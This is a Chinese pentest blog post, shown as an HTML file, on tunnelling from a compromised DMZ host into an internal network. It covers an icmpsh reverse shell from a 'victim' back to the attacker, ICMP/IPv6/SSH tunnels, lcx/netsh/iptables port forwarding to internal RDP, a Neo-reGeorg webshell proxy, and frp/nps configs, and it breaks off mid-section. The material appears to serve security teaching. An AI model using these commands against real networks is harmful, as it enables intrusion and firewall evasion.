@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网渗透-信息收集 | Mssn Harvey</title><meta name="keywords" content="内网渗透"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.前言：当我们在外网打下一个点，通过arp，netstat，以及ifconifg（ipconfig）等信息收集，发现此点为dmz，可通内网，那么这时候我们需要在此点上搭建通向内网的隧道，为内网渗透打下坚实基础。 2.常用隧道分类：根据不同层的网络协议，大致分为以下几种常用的隧道： 2.1 应用层：ssh隧道 http（https）隧道 dns隧道 2.2 传输层tcp隧道 udp隧道 常规端口转">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-信息收集">
+<meta property="og:url" content="http://example.com/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Mssn Harvey">
+<meta property="og:description" content="1.前言：当我们在外网打下一个点，通过arp，netstat，以及ifconifg（ipconfig）等信息收集，发现此点为dmz，可通内网，那么这时候我们需要在此点上搭建通向内网的隧道，为内网渗透打下坚实基础。 2.常用隧道分类：根据不同层的网络协议，大致分为以下几种常用的隧道： 2.1 应用层：ssh隧道 http（https）隧道 dns隧道 2.2 传输层tcp隧道 udp隧道 常规端口转">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg">
+<meta property="article:published_time" content="2021-03-17T06:21:20.000Z">
+<meta property="article:modified_time" content="2021-03-21T14:06:55.397Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-21 22:06:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(64).jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透-信息收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-17T06:21:20.000Z" title="发表于 2021-03-17 14:21:20">2021-03-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-21T14:06:55.397Z" title="更新于 2021-03-21 22:06:55">2021-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-前言："><a href="#1-前言：" class="headerlink" title="1.前言："></a>1.前言：</h2><p>当我们在外网打下一个点，通过arp，netstat，以及ifconifg（ipconfig）等信息收集，发现此点为dmz，可通内网，那么这时候我们需要在此点上搭建通向内网的隧道，为内网渗透打下坚实基础。</p>
+<h2 id="2-常用隧道分类："><a href="#2-常用隧道分类：" class="headerlink" title="2.常用隧道分类："></a>2.常用隧道分类：</h2><p>根据不同层的网络协议，大致分为以下几种常用的隧道：</p>
+<h3 id="2-1-应用层："><a href="#2-1-应用层：" class="headerlink" title="2.1 应用层："></a>2.1 应用层：</h3><p>ssh隧道</p>
+<p>http（https）隧道</p>
+<p>dns隧道</p>
+<h3 id="2-2-传输层"><a href="#2-2-传输层" class="headerlink" title="2.2 传输层"></a>2.2 传输层</h3><p>tcp隧道</p>
+<p>udp隧道</p>
+<p>常规端口转发</p>
+<h3 id="2-3-网络层"><a href="#2-3-网络层" class="headerlink" title="2.3 网络层"></a>2.3 网络层</h3><p>Ipv6隧道</p>
+<p>icmp隧道</p>
+<p>gre隧道</p>
+<h2 id="3-判断哪些流量能出网"><a href="#3-判断哪些流量能出网" class="headerlink" title="3.判断哪些流量能出网"></a>3.判断哪些流量能出网</h2><p>拿到一个点，并不是一上来就frp，frp虽然稳定，但是遇到一些特殊情况也不是很好用，如果遇到web服务器是通过端口映射出来的，本身主机不出网，这时候就得用webshell代理流量,当然还有一种，需要通过特定代理的服务器才能出网，这时候可以做浏览器的信息收集，这种情况外网资产扫端口也可以见，nmap扫出来的服务为sockets或者proxy服务什么的。</p>
+<p>综合判断几种协议的出网情况</p>
+<h3 id="3-1-icmp协议"><a href="#3-1-icmp协议" class="headerlink" title="3.1 icmp协议"></a>3.1 icmp协议</h3><p>ping 命令</p>
+<h3 id="3-2-Http协议"><a href="#3-2-Http协议" class="headerlink" title="3.2 Http协议"></a>3.2 Http协议</h3><h4 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h4><p>wget 命令</p>
+<p>curl 命令</p>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows:"></a>Windows:</h4><p>telnet</p>
+<p>浏览器</p>
+<h3 id="dns协议："><a href="#dns协议：" class="headerlink" title="dns协议："></a>dns协议：</h3><p>指向外网的vps作为dns服务器解析域名</p>
+<h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><p>Nslookup baidu.com vps</p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>dig@vps Baidu.com</p>
+<h2 id="4-搭建隧道实战"><a href="#4-搭建隧道实战" class="headerlink" title="4.搭建隧道实战"></a>4.搭建隧道实战</h2><h3 id="4-1-搭建ipv6隧道"><a href="#4-1-搭建ipv6隧道" class="headerlink" title="4.1 搭建ipv6隧道"></a>4.1 搭建ipv6隧道</h3><p>前提：支持ipv6，通过ipconfig（ifconfig）看有没有ipv6的地址</p>
+<p>特点：过安全设备，防火墙奇效</p>
+<p>原理：把ipv6协议封装数据包后继续用ipv4封装，本质在网络中传输还是ipv4，一些安全设备和防火墙不支持ipv6，所以就算拿到了进行分析也解不了包。</p>
+<p>这里我以6tunnel为例：</p>
+<p>github：<a target="_blank" rel="noopener" href="https://github.com/wojtekka/6tunnel">https://github.com/wojtekka/6tunnel</a></p>
+<p>gcc编译</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315215548963.png"></p>
+<p>端口转发：</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;6tunnel -4 80 需要转发的ipv6%eth0 80#将ipv6地址80端口转发到本地ipv4来，你也可以换成-6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315220238278.png"></p>
+<blockquote>
+<p>注意：ipv6隧道可以从ipv6地址到ipv6地址，也可以从ipv4地址到ipv6地址，但不能从ipv6到ipv4。如果从本机的ipv6地址到目标机的ipv4，测试抓到的包是ipv4的包，并不会对数据包进行ipv6封装，%是制定网卡</p>
+</blockquote>
+<p>访问ipv6地址时需指定网卡，例如http://[fe80::xxxx:xxxx%eth0]，或者curl -6 -g –interface eth0 “http://[fe80::20c:29ff:fe0f:57ba]:80” -vvv</p>
+<h3 id="4-2-搭建icmp隧道"><a href="#4-2-搭建icmp隧道" class="headerlink" title="4.2 搭建icmp隧道"></a>4.2 搭建icmp隧道</h3><p>前提：防火墙waf有允许icmp包文通过，关闭系统icmp自动答复，安装python-impacket</p>
+<p>特点：简单，实用</p>
+<p>原理：将tcp/udp 数据封装到icmp的ping数据包中，从而建立通信</p>
+<p>github：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
+<h4 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h4><p>关闭本地的icmp应答：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>本地主机监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py 192.168.75.131（本地ip） 192.168.75.132（受害者ip）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316183155801.png"></p>
+<p>在受害者主机运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t 192.168.75.131（攻击者）</span><br></pre></td></tr></table></figure>
+
+<h4 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h4><p>使用的是：ptunnel kali自带</p>
+<p>需要安装一些依赖库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libpcap环境</span><br><span class="line">libpcap依赖库</span><br><span class="line">wget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>在攻击vps上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 182.17.13.17(跳板机外网ip) -lp 8888 -da 10.10.10.18（内网需要转发端口的ip） -dp 3389 -x Gamma</span><br></pre></td></tr></table></figure>
+
+<p>在跳板机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x Gamma</span><br></pre></td></tr></table></figure>
+
+<p>内网10.10.10.18 3389端口就被转发到攻击vps的8888端口了</p>
+<h3 id="icmp隧道搭建"><a href="#icmp隧道搭建" class="headerlink" title="icmp隧道搭建"></a>icmp隧道搭建</h3><p>安装icmptunnel</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jamesbarlow/icmptunnel.git</span></span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>客户端和服务器需同时禁用icmp答复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>这里攻击者为服务端，受害者为客户端</p>
+<p>服务端配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;icmptunnel -s#以服务端启动</span><br><span class="line">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0 #配置一个ip</span><br></pre></td></tr></table></figure>
+
+<p>客户端配置：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./icmptunnel <span class="number">192.168</span><span class="number">.75</span><span class="number">.131</span>（服务端ip）</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 #配置一个ip</span><br></pre></td></tr></table></figure>
+
+<p>那么就可以隧道进行通信了</p>
+<h3 id="4-2-tcp端口转发"><a href="#4-2-tcp端口转发" class="headerlink" title="4.2 tcp端口转发"></a>4.2 tcp端口转发</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><p>工具：lcx.exe netsh ………</p>
+<p>把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网ip 8888 内网ip 3389</span><br></pre></td></tr></table></figure>
+
+<p>本地搭建端口之间的隧道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –listen 8888 3389#本地3389和8888端口进行连接</span><br></pre></td></tr></table></figure>
+
+<p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">#添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;外网IP listenport&#x3D;6666 connectaddress&#x3D;内网IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br><span class="line"></span><br><span class="line">#xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
+
+<p>连接外网6666端口，就是连接到内网目标上面的3389。</p>
+<p>linux：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 2 -p1 4444 -h2 公网主机ip -p2 3389</span><br></pre></td></tr></table></figure>
+
+<p>将4444端口的流量转发到3389端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 4444#内网主机执行</span><br></pre></td></tr></table></figure>
+
+<p>把内网的22端口转发到外网的3389端口 </p>
+<p>linux iptables使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#编辑配置文件</span><br><span class="line">vi &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward &#x3D; 1#开启IP转发</span><br><span class="line">#关闭服务	</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br><span class="line"></span><br><span class="line">#保存重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+
+<h3 id="webshell代理工具"><a href="#webshell代理工具" class="headerlink" title="webshell代理工具"></a>webshell代理工具</h3><p>配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#生成服务端</span><br><span class="line">python3 neoreg.py generate -k password	</span><br><span class="line"></span><br><span class="line">#在本地建立Socks5代理</span><br><span class="line">python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br></pre></td></tr></table></figure>
+
+<p>还可以用作端口转发，把webshell所在主机的端口转发到本地（不出网的情况很好用），请自行探索</p>
+<h3 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h3><p>SSH一般是允许通过防火墙的，而且传输过程是加密的</p>
+<h4 id="本地转发（正向）"><a href="#本地转发（正向）" class="headerlink" title="本地转发（正向）"></a>本地转发（正向）</h4><p>在中传VPS上执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; root@目标外网Web服务器（会要求输入密码）</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程转发（反向）"><a href="#远程转发（反向）" class="headerlink" title="远程转发（反向）"></a>远程转发（反向）</h3><p>在Web服务器上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; root@VPS-IP（会要求输入密码）</span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>VPS</code>的8090端口，即可连接内网数据库服务器的3389</p>
+<h3 id="Frp搭建隧道："><a href="#Frp搭建隧道：" class="headerlink" title="Frp搭建隧道："></a>Frp搭建隧道：</h3><p>github：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>简单地说，frp就是一个反向代理软件，它体积轻量但功能很强大，可以<strong>使处于内网或防火墙后的设备对外界提供服务</strong>，它支持HTTP、TCP、UDP等众多协议。</p>
+<h4 id="端口转发：-1"><a href="#端口转发：-1" class="headerlink" title="端口转发："></a>端口转发：</h4><p>服务端配置文件frps.init：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br></pre></td></tr></table></figure>
+
+<p>客户端配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp #流量类型</span><br><span class="line">local_ip &#x3D; 内网ip     # 局域网地址，可以是非本机ip       </span><br><span class="line">local_port &#x3D; 3389#要转发的端口</span><br><span class="line">remote_port &#x3D; 7001#远程端口</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure>
+
+<p>访问vps 7001 则访问内网3389端口</p>
+<p>启动的话就一个服务器./frps -c frps.ini 一个客户端./frpc -c frpc.ini</p>
+<h4 id="socks5代理更简单了："><a href="#socks5代理更简单了：" class="headerlink" title="socks5代理更简单了："></a>socks5代理更简单了：</h4><p>客户端配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[socks_proxy]</span><br><span class="line">type &#x3D; tcp #流量类型</span><br><span class="line">remote_port &#x3D; 7001#远程端口</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure>
+
+<h3 id="搭建NPS隧道："><a href="#搭建NPS隧道：" class="headerlink" title="搭建NPS隧道："></a>搭建NPS隧道：</h3><p>frp不行，又不会改流量特征，可以用用nps</p>
+<p>使用步骤：</p>
+<ul>
+<li>开启服务端，假如公网服务器ip为1.1.1.1，配置文件中<code>bridge_port</code>为8024，配置文件中<code>web_port</code>为8080</li>
+<li>访问1.1.1.1:8080</li>
+<li>在客户端管理中创建一个客户端，记录下验证密钥</li>
+<li>内网客户端运行（windows使用cmd运行加.exe）</li>
+</ul>
+<p>1、下载nps服务端到自己的VPS（<a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps%EF%BC%89">https://ehang-io.github.io/nps）</a></p>
